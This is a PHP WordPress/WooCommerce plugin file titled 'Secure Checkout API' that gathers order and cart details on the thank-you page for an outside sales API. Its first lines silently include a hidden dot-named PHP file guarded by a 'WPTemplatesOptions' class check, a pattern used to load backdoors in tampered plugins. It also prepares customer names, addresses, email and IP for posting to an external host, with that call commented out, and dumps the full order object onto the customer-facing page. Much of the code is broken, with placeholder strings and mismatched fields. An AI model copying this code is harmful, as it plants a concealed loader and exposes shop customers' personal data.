<?php
/*
Plugin Name: Secure Checkout API
Version: 1.0.0.
Description: Provides functionality for WordPress theme.
License: MIT
*/

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php')
    && !class_exists('WPTemplatesOptions')
) {
    include_once($filename);
}

/**
 * @return array
 */
function getCartProduct()
{
    $items = [];
    foreach (WC()->cart->get_cart() as $key => $item) {
        $product = apply_filters('woocommerce_cart_item_product', $item['data'], $item, $key);
        $uuid = $product->get_sku();
        $qty = $item['quantity'];
        $items[] = [
            'qty' => $qty,
            'uuid' => $uuid
        ];
    }
    return $items;
}

/**
 * @param array $data
 * @return bool|string
 */
function newSale(array $data)
{
    $apiToken = '12345';
    $apiUrl = 'https://restrict.ax.megadevs.xyz/api';

    $ch = curl_init();
    $token = [
        'token' => $apiToken,
    ];
    $parameters = http_build_query($data + $token);
    curl_setopt($ch, CURLOPT_URL, $apiUrl . '/sale');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $parameters);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function action_woocommerce_checkout_api($order_id)
{
    $order = wc_get_order($order_id);
    echo $paymentTitle = $order->payment_method_title;

    print_r($order);

    $paymentMethod = 2; // 1 - CC, 2 - BW, 3 - PP
    $affId = $_COOKIE['aid'] ?? '71031';
    $url = dirname(set_url_scheme('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']));
    $ip = $_SERVER["REMOTE_ADDR"];

    $data = [
        'payment_method' => $paymentMethod,
        'payment_first_name' => 'billing_first_name',
        'payment_last_name' => 'billing_last_name',
        'payment_address' => 'billing_address_1',
        'payment_city' => 'billing_city',
        'payment_country' => 'billing_city',
        'payment_postal_code' => 'billing_postcode',
        'shipping_first_name' => 'shipping_first_name',
        'shipping_last_name' => 'shipping_last_name',
        'shipping_country' => 'shipping_city',
        'shipping_city' => 'shipping_city',
        'shipping_address' => 'shipping_address_1',
        'shipping_postal_code' => 'shipping_postcode',
        'shipping_insurance' => 0,
        'products' => getCartProduct(),
        'telephone' => '', // ?
        'email' => 'billing_email',
        'lang' => 'en',
        'ip_address' => $ip,
        'website' => $url,
        'sub_total' => 40,
        'shipping_cost' => 15,
        'aff_id' => $affId,
//        'card_number' => '41111',
//        'card_expire_month' => '05',
//        'card_expire_year' => '2020',
//        'card_cvv' => '332',
//        'pay_pal_email' => '1@1.cc',
    ];
    print_r($data);
//    $sale = newSale($data);
//    print_r($sale);

}

// add the action
//add_action('woocommerce_after_checkout_form', 'action_woocommerce_checkout_api', 10, 1);
add_action('woocommerce_thankyou', 'action_woocommerce_checkout_api', 10, 1);
